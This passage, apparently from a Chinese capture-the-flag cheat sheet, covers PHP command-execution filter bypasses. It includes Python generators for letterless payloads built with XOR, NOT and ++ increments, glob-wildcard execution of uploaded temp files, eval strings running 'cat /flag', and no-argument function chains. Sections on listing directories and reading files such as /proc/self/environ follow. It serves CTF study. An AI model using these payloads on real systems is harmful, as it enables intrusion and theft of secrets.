<span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span> <span class="comment">#双引号可换单引号</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li><li><p><code>++</code>运算自增构造</p><p>参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">	offset = <span class="number">3</span> + buff</span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	base = <span class="number">65</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		_<span class="built_in">ascii</span> = <span class="built_in">ord</span>(payload[i])</span><br><span class="line">		<span class="comment">#init</span></span><br><span class="line">		underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (<span class="built_in">len</span>(payload) + offset + <span class="number">15</span>))</span><br><span class="line">		var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">		res += var;</span><br><span class="line">		tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> _<span class="built_in">ascii</span> &gt; base:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(_<span class="built_in">ascii</span>-base):</span><br><span class="line">				tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">		res += tmp</span><br><span class="line"></span><br><span class="line">	first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line">	<span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.构造STRTOLOWER并存进变量a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.构造SHOW_SOURCE并存进变量b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造/FLAG并存进变量c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#声明好abc变量</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.变量d = a(c) 则变量d为/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"><span class="built_in">print</span>(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关键字构造</span></span><br><span class="line"><span class="comment">#$_GET[0]($_GET[1]);</span></span><br><span class="line">need = <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">			now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">		out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></li><li><p>文件上传+执行</p><p>参考：</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但是，在执行第一个匹配上的文件的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>glob通配符支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。可以利用<code>[@-[]</code>来表示大写字母。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p><strong>POST上传文件数据包</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在上传文件<code>1.php</code>内容添加<strong>sh命令</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>上传抓包，构造<strong>poc执行命令</strong>：</p><p><code>?c=./???/????????[@-[]</code></p></li><li><p>通配符（仅无字母）</p><p>base64: <code>/???/????64 ????.???</code></p><p>bzip2: <code>/???/???/????2 ????.???</code></p></li><li><p><code>[~(异或)][!%FF]</code>形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one</span>(<span class="params">s</span>):</span></span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">组成类似于system(pos(next(getallheaders())));即可</span></span><br><span class="line"><span class="string">a=whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;:&gt;&quot;</span>).strip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure></li><li><p>eval函数下</p><ul><li><p>字符串拼接</p><p><code>a=(s.y.s.t.e.m)(&#39;cat /flag&#39;);</code></p></li><li><p>进制编码</p><p><code>a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;);</code></p></li><li><p>异或</p><p><code>a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;);</code></p><p><code>a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;);</code></p></li><li><p>套娃</p><p><code>a=eval($_POST[1]);&amp;1=phpinfo();</code></p></li></ul></li><li><p>纯数字构造（Linux系统级）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$((<span class="variable">$&#123;_&#125;</span>))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">$((~$((<span class="variable">$&#123;_&#125;</span>))))</span><br><span class="line"><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))))))</span><br><span class="line"><span class="comment">#36</span></span><br><span class="line"><span class="comment">#去+号也可</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line"><span class="comment">#36	</span></span><br><span class="line"><span class="comment">#去+号也可</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="无参数-带参数RCE"><a href="#无参数-带参数RCE" class="headerlink" title="无参数/带参数RCE"></a>无参数/带参数RCE</h3><h4 id="无参函数"><a href="#无参函数" class="headerlink" title="无参函数"></a>无参函数</h4><ul><li><p>phpinfo()</p></li><li><p>phpversion()</p><p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; .</code></p><p><code>chr(ord(hebrevc(crypt(phpversion())))) -&gt; .</code></p></li><li><p>localeconv()</p><p>返回一包含本地数字及货币格式信息的数组，而数组第一项就是<code>.</code>。</p></li><li><p>time()</p><p>返回当前Unix时间戳。</p></li><li><p>localtime()</p><p>取得本地时间。</p></li><li><p>getcwd()</p><p>返回当前工作目录。</p></li><li><p>dirname()</p><p>返回路径中的目录部分。</p></li><li><p>getenv()</p><p>获取一个环境变量的值（在7.1之后可以不给予参数）。</p></li><li><p>getallheaders()</p><p>获取全部HTTP请求头信息。（Apache）</p></li><li><p>get_defined_vars()</p><p>返回由所有已定义变量所组成的数组。（Nginx）</p></li><li><p>get_defined_functions()</p><p>返回由所有已定义函数所组成的数组。</p></li><li><p>session_start()</p><p>启动新会话或者重用现有会话，告诉PHP使用session。（PHP默认是不主动使用session的，配合<code>session_id()</code>）</p></li><li><p>realpath_cache_get()</p><p>获得真实路径缓存的详情。</p></li><li><p>get_class()</p><p>获取当前调用方法的类名。</p></li><li><p>get_called_class()</p><p>获取静态绑定后的类名。</p></li></ul><h4 id="套用函数（有参）"><a href="#套用函数（有参）" class="headerlink" title="套用函数（有参）"></a>套用函数（有参）</h4><ul><li><p>array_map()</p><p>返回用户自定义函数作用后的数组。</p><p><code>array_map(&#39;system&#39;,[&#39;ls&#39;]);</code></p></li><li><p>scandir()</p><p>列出指定路径中的文件和目录。</p><p><code>scandir(&#39;.&#39;)</code></p></li><li><p>glob()</p><p>返回匹配指定模式的文件名或目录。</p><p><code>print_r(glob(&quot;*&quot;));</code></p><p><code>print_r(glob(&quot;./*&quot;)[2]);</code></p></li><li><p>current()</p><p>返回数组中的当前单元，默认取第一个值。</p><p><code>current(localeconv()) → .</code></p><p><code>?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</code></p></li><li><p>pos()</p><p>返回数组中的当前元素的值，<code>current()</code>函数的别名。</p></li><li><p>next() / prev() / reset() / end()</p><p>将数组的内部指针向前移动一位 / 倒回一位 / 指向第一个单元 / 指向最后一个单元。</p><p><code>end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy</code> （配合自定义请求头绕过关键字）</p></li><li><p>assert() / eval()</p><p>命令执行。</p><p><code>assert(phpinfo(););</code></p><p><code>assert(assert($_POST[c]));</code></p></li><li><p>chdir()</p><p>改变目录。</p></li><li><p>file_get_contents()</p></li><li><p>highlight_file() / show_source()</p></li><li><p>readfile() / readgzfile()</p></li><li><p>echo()</p></li><li><p>print_r()</p></li><li><p>var_dump()</p></li><li><p>dirname()</p><p>返回路径中的目录部分。</p></li><li><p>chr()</p><p>从指定的 ASCII 值返回字符。</p></li><li><p>array_reverse()</p><p>以相反的元素顺序返回数组。</p></li><li><p>array_rand()</p><p>返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机键名的数组。</p></li><li><p>array_flip()</p><p>用于反转/交换数组中所有的键名以及它们关联的键值。</p></li><li><p>array_slice()</p><p>在数组中根据条件取出一段值，并返回。</p></li><li><p>hex2bin()</p><p>转换十六进制字符串为二进制字符串。</p></li><li><p>session_id()</p><p>获取到当前的session id。</p><p><code>session_id(session_start())</code></p></li><li><p>create_function()</p><p>创建一个匿名函数（lambda样式）。代码注入。</p></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">https://www.cnblogs.com/wangtanzhi/p/12311239.html</a></p><p>​</p><h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><ul><li><p>SPL目录类：<code>DirectoryIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//可用于猜解文件名</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPL目录类：<code>FilesystemIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(getcwd());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPL目录类：<code>GlobIterator</code></p><p>可通配例如<code>/var/html/www/flag*</code></p></li><li><p>scandir()</p></li><li><p>面向过程方法：opendir()，readdir()，closedir()</p></li><li><p>面向对象方法：PHP的<code>dir</code>类</p><p>​</p></li></ul><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><ul><li><p>特殊文件：</p><ul><li>/proc/self/cmdline - 应用运行的文件夹</li><li>/proc/self/environ（/proc/1/environ） - 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示。重要的属性，比如WEB服务的权限</li><li>/proc/self/cwd - 当前目录</li><li>/proc/pid/fd/[NUM] - 是个目录，包含当前进程打开的每一个文件的文件描述符，这些文件描述符是指向实际文件的一个符号链接</li></ul></li><li><p>file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file())</p></li><li><p>fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetss(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       <span class="comment">//php7.3版本后 